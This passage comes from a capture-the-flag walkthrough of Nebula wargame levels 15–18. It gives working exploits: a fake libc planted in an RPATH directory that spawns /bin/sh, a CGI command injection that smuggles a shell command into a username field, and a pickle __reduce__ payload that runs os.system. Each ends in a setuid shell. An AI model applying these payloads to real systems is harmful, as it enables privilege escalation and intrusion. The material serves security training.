&lt;p&gt;Logged in as user &lt;code&gt;level15&lt;/code&gt;, we see 1 file in the &lt;code&gt;flag15&lt;/code&gt; directory called &lt;code&gt;flag15&lt;/code&gt;. Running it simply tells us to &lt;em&gt;strace it!&lt;/em&gt;. Running it with &lt;code&gt;strace&lt;/code&gt; immediately reveals a whole bunch of interesting things about &lt;code&gt;flag15&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;level15@nebula:/home/flag15$ strace ./flag15
execve(&amp;quot;./flag15&amp;quot;, [&amp;quot;./flag15&amp;quot;], [/* 20 vars */]) = 0
brk(0)                                  = 0x88c9000
access(&amp;quot;/etc/ld.so.nohwcap&amp;quot;, F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb786b000
access(&amp;quot;/etc/ld.so.preload&amp;quot;, R_OK)      = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/tls/i686/sse2/cmov&amp;quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/tls/i686/sse2/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/tls/i686/sse2&amp;quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/tls/i686/cmov/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/tls/i686/cmov&amp;quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/tls/i686/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/tls/i686&amp;quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/tls/sse2/cmov/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/tls/sse2/cmov&amp;quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/tls/sse2/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/tls/sse2&amp;quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/tls/cmov/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/tls/cmov&amp;quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/tls/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/tls&amp;quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/i686/sse2/cmov/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/i686/sse2/cmov&amp;quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/i686/sse2/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/i686/sse2&amp;quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/i686/cmov/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/i686/cmov&amp;quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/i686/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/i686&amp;quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/sse2/cmov/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/sse2/cmov&amp;quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/sse2/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/sse2&amp;quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/cmov/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/cmov&amp;quot;, 0xbfd0bf54) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15&amp;quot;, {st_mode=S_IFDIR|0775, st_size=3, ...}) = 0
open(&amp;quot;/etc/ld.so.cache&amp;quot;, O_RDONLY)      = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=33815, ...}) = 0
mmap2(NULL, 33815, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7862000
close(3)                                = 0
access(&amp;quot;/etc/ld.so.nohwcap&amp;quot;, F_OK)      = -1 ENOENT (No such file or directory)
open(&amp;quot;/lib/i386-linux-gnu/libc.so.6&amp;quot;, O_RDONLY) = 3
read(3, &amp;quot;\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\222\1\0004\0\0\0&amp;quot;..., 512) = 512
fstat64(3, {st_mode=S_IFREG|0755, st_size=1544392, ...}) = 0
mmap2(NULL, 1554968, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xe78000
mmap2(0xfee000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x176) = 0xfee000
mmap2(0xff1000, 10776, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xff1000
close(3)                                = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7861000
set_thread_area({entry_number:-1 -&amp;gt; 6, base_addr:0xb78618d0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
mprotect(0xfee000, 8192, PROT_READ)     = 0
mprotect(0x8049000, 4096, PROT_READ)    = 0
mprotect(0x199000, 4096, PROT_READ)     = 0
munmap(0xb7862000, 33815)               = 0
fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 1), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb786a000
write(1, &amp;quot;strace it!\n&amp;quot;, 11strace it!
)            = 11
exit_group(11)                          = ?
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;There are &lt;strong&gt;plenty&lt;/strong&gt; of attempts to load &lt;code&gt;libc.so.6&lt;/code&gt; from various locations! I checked out what is in &lt;code&gt;/var/tmp&lt;/code&gt; and found the original &lt;code&gt;flag15&lt;/code&gt; folder there. It was empty. My initial thought were I need to give it a &lt;code&gt;libc.so.6&lt;/code&gt; to load, but obviously one that will be useful enough to me so that I may gain some form of code execution.&lt;/p&gt;

&lt;p&gt;This challenge had me on another Google ride in order to understand what is going on here. From what I could gather, when a binary is compiled with &lt;code&gt;gcc&lt;/code&gt;, it is possible to add &lt;code&gt;hwcap&lt;/code&gt; support for different processor architectures. It is also possible to tell the linker from where it should load dynamic libraries using a &lt;a href=&#34;http://en.wikipedia.org/wiki/Rpath&#34;&gt;rpath&lt;/a&gt;. In the case of &lt;code&gt;flag15&lt;/code&gt;, the &lt;code&gt;RPATH&lt;/code&gt; is set to &lt;code&gt;/var/tmp/flag15&lt;/code&gt;. We can see this using &lt;code&gt;readelf&lt;/code&gt; and looking at the dynamic section:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level15@nebula:/home/flag15$ readelf -d ./flag15

Dynamic section at offset 0xf20 contains 21 entries:
  Tag        Type                         Name/Value
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]
 0x0000000c (INIT)                       0x80482c0
 0x0000000d (FINI)                       0x80484ac

 [...]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ok, so that kinda explained the &lt;em&gt;why&lt;/em&gt; its loading libc.so.6 from there, but not really the &amp;lsquo;how this can be useful&amp;rsquo;. I was still a little stuck on the previous &lt;code&gt;LD_PRELOAD&lt;/code&gt; hackery, but had to constantly remind myself that that environment variable will be discarded in the case of the SETUID program.&lt;/p&gt;

&lt;p&gt;I was a little unsure how to get something useful going from here. I touched a file called &lt;code&gt;libc.so.6&lt;/code&gt; in &lt;code&gt;/var/tmp/flag15/&lt;/code&gt; and launched the binary, just to get a starting point:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level15@nebula:/var/tmp/flag15$ touch libc.so.6
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
/home/flag15/flag15: error while loading shared libraries: /var/tmp/flag15/libc.so.6: file too short
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I was not expecting much from that attempt, but it helped me get started. Eventually I figured I could have a look at &lt;code&gt;flag15&lt;/code&gt; and check which libc function I could &amp;ldquo;override??&amp;rdquo; from the RELO table:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level15@nebula:/var/tmp/flag15$ objdump -R ~flag15/flag15

/home/flag15/flag15:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049ff0 R_386_GLOB_DAT    __gmon_start__
0804a000 R_386_JUMP_SLOT   puts
0804a004 R_386_JUMP_SLOT   __gmon_start__
0804a008 R_386_JUMP_SLOT   __libc_start_main
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;puts()&lt;/code&gt; seems like an ok target for me! This is probably the function used to print the &lt;em&gt;strace it!&lt;/em&gt; message. At this stage I figured I could take the same route as I did with the previous &lt;code&gt;LD_PRELOAD&lt;/code&gt; attack, except this time I just &amp;lsquo;fake&amp;rsquo; it in my fake libc. I looked up the &lt;code&gt;puts()&lt;/code&gt; arguments from the man page again and started a new function:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level15@nebula:/var/tmp/flag15$ cat fake_libc.c
#include&amp;lt;stdio.h&amp;gt;
int puts(const char *s) {
    printf(&amp;quot;Not the real puts!\n&amp;quot;);
}

level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC fake_libc.c -o libc.so.6

level15@nebula:/var/tmp/flag15$ ~flag15/flag15
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
/home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol __cxa_finalize, version GLIBC_2.1.3 not defined in file libc.so.6 with link time reference
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ow, that exploded pretty badly it seems. From the error message I figured the function &lt;code&gt;__cxa_finalize&lt;/code&gt; simply did not exist in my library, so all I had to do was add it&amp;hellip; Right? I googled the &lt;a href=&#34;https://refspecs.linuxbase.org/LSB_3.2.0/LSB-Core-generic/LSB-Core-generic/baselib---cxa_finalize.html&#34;&gt;function arguments&lt;/a&gt; and added it to my fake libc:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level15@nebula:/var/tmp/flag15$ cat fake_libc.c
#include&amp;lt;stdio.h&amp;gt;
void __cxa_finalize(void * d) {
}

int puts(const char *s) {
    printf(&amp;quot;Not the real puts!\n&amp;quot;);
}
level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC fake_libc.c -o libc.so.6
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)
/home/flag15/flag15: relocation error: /home/flag15/flag15: symbol __libc_start_main, version GLIBC_2.0 not defined in file libc.so.6 with link time reference
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Oh! New error. I guess I was making progress. This time there is apparently no &lt;code&gt;__libc_start_main&lt;/code&gt; in the library. At this stage I was a little confused as to what was going on here as this function was also in the RELO table for &lt;code&gt;flag15&lt;/code&gt;. Anyways, as with &lt;code&gt;__cxa_finalize&lt;/code&gt;, I Googled the &lt;a href=&#34;http://refspecs.linuxbase.org/LSB_3.1.1/LSB-Core-generic/LSB-Core-generic/baselib---libc-start-main-.html&#34;&gt;function arguments&lt;/a&gt; for this one too and added it to my fake libc. It was also at this stage that I realized I could just use this function instead of &lt;code&gt;puts&lt;/code&gt;, so I went ahead and deleted the other functions:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level15@nebula:/var/tmp/flag15$ cat fake_libc.c
#include&amp;lt;stdio.h&amp;gt;

int __libc_start_main(int (*main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)) {
    return 0;
}

level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC fake_libc.c -o libc.so.6
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)
Inconsistency detected by ld.so: dl-lookup.c: 169: check_match: Assertion `version-&amp;gt;filename == ((void *)0) || ! _dl_name_match_p (version-&amp;gt;filename, map)&#39; failed!
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Oh! Another new error :( This time though it was not about a missing function/symbol, but rather something I could not make out by myself. I found little information about this specific error. After a really really long time of searching I finally decided to &lt;code&gt;ldd&lt;/code&gt; &lt;code&gt;flag15&lt;/code&gt; again now that my fake libc is available:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level15@nebula:/var/tmp/flag15$ ldd ~flag15/flag15
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)
    linux-gate.so.1 =&amp;gt;  (0x00e47000)
    libc.so.6 =&amp;gt; /var/tmp/flag15/libc.so.6 (0x00761000)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The search term &lt;em&gt;no version information available (required by&lt;/em&gt; was the magic that finally got me towards an answer! I came across &lt;a href=&#34;http://stackoverflow.com/questions/137773/what-does-the-no-version-information-available-error-from-linux-dynamic-linker&#34;&gt;this&lt;/a&gt; and &lt;a href=&#34;http://superuser.com/questions/735736/no-version-information-available-required-by-usr-bin-ssh&#34;&gt;this&lt;/a&gt; post which talks about custom linking scripts. Basically, if I were to create a file with the contents &lt;code&gt;GLIBC_2.0 {};&lt;/code&gt; in it and tell the linker at compile time (with &lt;code&gt;-Wl&lt;/code&gt;) about it, then my problem will go away :)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level15@nebula:/var/tmp/flag15$ cat version.ld
GLIBC_2.0 {
};

level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC -Wl,--version-script=version.ld fake_libc.c -o libc.so.6
level15@nebula:/var/tmp/flag15$ ldd ~flag15/flag15
    linux-gate.so.1 =&amp;gt;  (0x002b3000)
    libc.so.6 =&amp;gt; /var/tmp/flag15/libc.so.6 (0x00ca0000)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;w00t. My &lt;code&gt;ldd&lt;/code&gt; Error went away :)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC -Wl,--version-script=version.ld fake_libc.c -o libc.so.6
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: version `GLIBC_2.1.3&#39; not found (required by /var/tmp/flag15/libc.so.6)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Another version related error. This time though it was for GLIBC version 2.1.3. I spiraled down another Google tunnel with this one and eventually came across static linking options for the linker. Basically, with &lt;code&gt;-Bstatic&lt;/code&gt; and &lt;code&gt;-static-libgcc&lt;/code&gt; we tell the compiler not to link against shared libraries. So, I added these too:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level15@nebula:/var/tmp/flag15$ gcc -shared -static-libgcc -fPIC -Wl,--version-script=version.ld,-Bstatic fake_libc.c -o libc.so.6
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
Segmentation fault
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And now we are segfaulting. Great! &lt;strong&gt;Not!&lt;/strong&gt; I poked around &lt;code&gt;gdb&lt;/code&gt; a little and prodded around. Eventually I figured I should check if my &lt;code&gt;__libc_start_main&lt;/code&gt; function is being called before the crash:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level15@nebula:/var/tmp/flag15$ cat fake_libc.c
#include&amp;lt;stdio.h&amp;gt;

int __libc_start_main(int (*main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)) {
    printf(&amp;quot;hi mom!\n&amp;quot;); /* Added this line! */
    return 0;
}
level15@nebula:/var/tmp/flag15$ gcc -shared -static-libgcc -fPIC -Wl,--version-script=version.ld,-Bstatic fake_libc.c -o libc.so.6
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
hi mom!
Segmentation fault
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Yes! :D So even though I am causing &lt;code&gt;flag15&lt;/code&gt; to crash, I have managed to introduce some code to it. I finally decided to add the &lt;code&gt;system()&lt;/code&gt; call and recompile my fake libc.&lt;/p&gt;

&lt;p&gt;So, to solve level15:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level15@nebula:/var/tmp/flag15$ cat fake_libc.c
#include&amp;lt;stdio.h&amp;gt;

int __libc_start_main(int (*main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)) {
    system(&amp;quot;/bin/sh&amp;quot;);
    return 0;
}
level15@nebula:/var/tmp/flag15$ gcc -shared -static-libgcc -fPIC -Wl,--version-script=version.ld,-Bstatic fake_libc.c -o libc.so.6
level15@nebula:/var/tmp/flag15$ ~flag15/flag15
sh-4.2$ getflag
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;level16&#34;&gt;level16&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level16/&#34;&gt;Level16&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;There is a perl script running on port 1616.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;With the description we are provided with the source code of a small Perl program:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;#!/usr/bin/env perl

use CGI qw{param};

print &amp;quot;Content-type: text/html\n\n&amp;quot;;

sub login {
  $username = $_[0];
  $password = $_[1];

  $username =~ tr/a-z/A-Z/; # conver to uppercase
  $username =~ s/\s.*//;        # strip everything after a space

  @output = `egrep &amp;quot;^$username&amp;quot; /home/flag16/userdb.txt 2&amp;gt;&amp;amp;1`;
  foreach $line (@output) {
      ($usr, $pw) = split(/:/, $line);


      if($pw =~ $password) {
          return 1;
      }
  }

  return 0;
}

sub htmlz {
  print(&amp;quot;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Login resuls&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;quot;);
  if($_[0] == 1) {
      print(&amp;quot;Your login was accepted&amp;lt;br/&amp;gt;&amp;quot;);
  } else {
      print(&amp;quot;Your login failed&amp;lt;br/&amp;gt;&amp;quot;);
  }
  print(&amp;quot;Would you like a cookie?&amp;lt;br/&amp;gt;&amp;lt;br/&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;\n&amp;quot;);
}

htmlz(login(param(&amp;quot;username&amp;quot;), param(&amp;quot;password&amp;quot;)));
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This script has a seemingly less obvious command injection vulnerability. The &lt;code&gt;egrep&lt;/code&gt; command eventually gets the &lt;code&gt;$username&lt;/code&gt; variable. This after it has gone through 2 sets of filters, one converting the username to uppercase and another truncating everything after a space. These filters are the core of the challenge.&lt;/p&gt;

&lt;p&gt;Similarly to the other command injections, I replicated the filters so that I could print the output and see how I could manipulate them. The biggest problem being the fact that everything was converted to uppercase. Thankfully, that got sorted really quickly when I learnt of the &lt;code&gt;${A,,}&lt;/code&gt; operator in bash. After quite a bit of trying different things, I finally got something that would work. I would first make the egrep happy by redirecting something to it to grep through. Once that was done, I declared a new variable &lt;code&gt;A&lt;/code&gt; and set the command I wanted to run to it. Thereafter I converted it to lowercase and executed it wit &lt;code&gt;${A,,}&lt;/code&gt; and commented the rest of the line out with a hash (#).&lt;/p&gt;

&lt;p&gt;So, to solve level16:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level16@nebula:~$ vim /var/tmp/flag16.sh
level16@nebula:~$ chmod +x /var/tmp/flag16.sh
level16@nebula:~$ cat /var/tmp/flag16.sh
#!/bin/sh
gcc /var/tmp/shell.c -o /var/tmp/flag16
chmod 4777 /var/tmp/flag16
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;On my host machine, I requested the web page hosting the perl script, triggering &lt;code&gt;/var/tmp/flag16&lt;/code&gt; to run:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;~ » curl -v &amp;quot;http://192.168.217.239:1616/index.cgi?$(python -c &#39;import urllib; print urllib.urlencode({ &amp;quot;username&amp;quot; : &amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;lt;/etc/passwd;A=&amp;quot;/var/tmp/flag16.sh&amp;quot;;${A,,};#&amp;quot;&amp;quot;&amp;quot;, &amp;quot;password&amp;quot; : &amp;quot;a&amp;quot; })&#39;)&amp;quot;
* Hostname was NOT found in DNS cache
*   Trying 192.168.217.239...
* Connected to 192.168.217.239 (192.168.217.239) port 1616 (#0)
&amp;gt; GET /index.cgi?username=%22%3C%2Fetc%2Fpasswd%3BA%3D%22%2Fvar%2Ftmp%2Fflag16.sh%22%3B%24%7BA%2C%2C%7D%3B%23&amp;amp;password=a HTTP/1.1
&amp;gt; User-Agent: curl/7.37.1
&amp;gt; Host: 192.168.217.239:1616
&amp;gt; Accept: */*
&amp;gt;
* HTTP 1.0, assume close after body
&amp;lt; HTTP/1.0 200 OK
&amp;lt; Content-type: text/html
&amp;lt;
&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Login resuls&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;Your login failed&amp;lt;br/&amp;gt;Would you like a cookie?&amp;lt;br/&amp;gt;&amp;lt;br/&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
* Closing connection 0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And then, just to read the flag:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level16@nebula:~$ /var/tmp/flag16
sh-4.2$ getflag
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;level17&#34;&gt;level17&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level17/&#34;&gt;Level17&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;There is a python script listening on port 10007 that contains a vulnerability.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;With the description we are provided with the source code of a small Python program:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;#!/usr/bin/python

import os
import pickle
import time
import socket
import signal

signal.signal(signal.SIGCHLD, signal.SIG_IGN)

def server(skt):
  line = skt.recv(1024)

  obj = pickle.loads(line)

  for i in obj:
      clnt.send(&amp;quot;why did you send me &amp;quot; + i + &amp;quot;?\n&amp;quot;)

skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
skt.bind((&#39;0.0.0.0&#39;, 10007))
skt.listen(10)

while True:
  clnt, addr = skt.accept()

  if(os.fork() == 0):
      clnt.send(&amp;quot;Accepted connection from %s:%d&amp;quot; % (addr[0], addr[1]))
      server(clnt)
      exit(1)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;With this level, it was immediately obvious that user input was being used to unpickle. This is dangerous as user supplied code could be executed when the unpickle occurs. So, my plan was to write a simple class with a &lt;code&gt;__reduce__&lt;/code&gt; method to pickle and send that over the socket that this code is listening on.&lt;/p&gt;

&lt;p&gt;So, to solve level17:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level17@nebula:/var/tmp/flag17-prep$ cat sploit.py
from netcat import Netcat
import pickle
import os

command = &amp;quot;&amp;quot;&amp;quot;gcc /var/tmp/shell.c -o /var/tmp/flag17; chmod 4777 /var/tmp/flag17&amp;quot;&amp;quot;&amp;quot;

# setup the pickle
class DoCmd(object):
    def __reduce__(self):
        return (os.system, (&#39;{cmd}&#39;.format(cmd = command),))

nc =  Netcat(&#39;127.0.0.1&#39;, 10007)
nc.read()
nc.write(pickle.dumps(DoCmd()))
nc.close()

level17@nebula:/var/tmp/flag17-prep$ python sploit.py
level17@nebula:/var/tmp/flag17-prep$ /var/tmp/flag17
sh-4.2$ getflag
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;level18&#34;&gt;level18&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level18/&#34;&gt;Level18&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Analyse the C program, and look for vulnerabilities in the program. There is an easy way to solve this level, an intermediate way to solve it, and a more difficult/unreliable way to solve it.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;With the description we are provided with the source code of a small C program:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;getopt.h&amp;gt;

struct {
  FILE *debugfile;
  int verbose;
  int loggedin;
} globals;

#define dprintf(...) if(globals.debugfile) \
  fprintf(globals.debugfile, __VA_ARGS__)
#define dvprintf(num, ...) if(globals.debugfile &amp;amp;&amp;amp; globals.verbose &amp;gt;= num) \
  fprintf(globals.debugfile, __VA_ARGS__)

#define PWFILE &amp;quot;/home/flag18/password&amp;quot;

void login(char *pw)
{
  FILE *fp;

  fp = fopen(PWFILE, &amp;quot;r&amp;quot;);
  if(fp) {
      char file[64];

      if(fgets(file, sizeof(file) - 1, fp) == NULL) {
          dprintf(&amp;quot;Unable to read password file %s\n&amp;quot;, PWFILE);
          return;
      }
                fclose(fp);
      if(strcmp(pw, file) != 0) return;
  }
  dprintf(&amp;quot;logged in successfully (with%s password file)\n&amp;quot;,
      fp == NULL ? &amp;quot;out&amp;quot; : &amp;quot;&amp;quot;);

  globals.loggedin = 1;

}

void notsupported(char *what)
{
  char *buffer = NULL;
  asprintf(&amp;amp;buffer, &amp;quot;--&amp;gt; [%s] is unsupported at this current time.\n&amp;quot;, what);
  dprintf(what);
  free(buffer);
}

void setuser(char *user)
{
  char msg[128];

  sprintf(msg, &amp;quot;unable to set user to &#39;%s&#39; -- not supported.\n&amp;quot;, user);
  printf(&amp;quot;%s\n&amp;quot;, msg);

}

int main(int argc, char **argv, char **envp)
{
  char c;

  while((c = getopt(argc, argv, &amp;quot;d:v&amp;quot;)) != -1) {
      switch(c) {
          case &#39;d&#39;:
              globals.debugfile = fopen(optarg, &amp;quot;w+&amp;quot;);
              if(globals.debugfile == NULL) err(1, &amp;quot;Unable to open %s&amp;quot;, optarg);
              setvbuf(globals.debugfile, NULL, _IONBF, 0);
              break;
          case &#39;v&#39;:
              globals.verbose++;
              break;
      }
  }

  dprintf(&amp;quot;Starting up. Verbose level = %d\n&amp;quot;, globals.verbose);

  setresgid(getegid(), getegid(), getegid());
  setresuid(geteuid(), geteuid(), geteuid());

  while(1) {
      char line[256];
      char *p, *q;

      q = fgets(line, sizeof(line)-1, stdin);
      if(q == NULL) break;
      p = strchr(line, &#39;\n&#39;); if(p) *p = 0;
      p = strchr(line, &#39;\r&#39;); if(p) *p = 0;

      dvprintf(2, &amp;quot;got [%s] as input\n&amp;quot;, line);

      if(strncmp(line, &amp;quot;login&amp;quot;, 5) == 0) {
          dvprintf(3, &amp;quot;attempting to login\n&amp;quot;);
          login(line + 6);
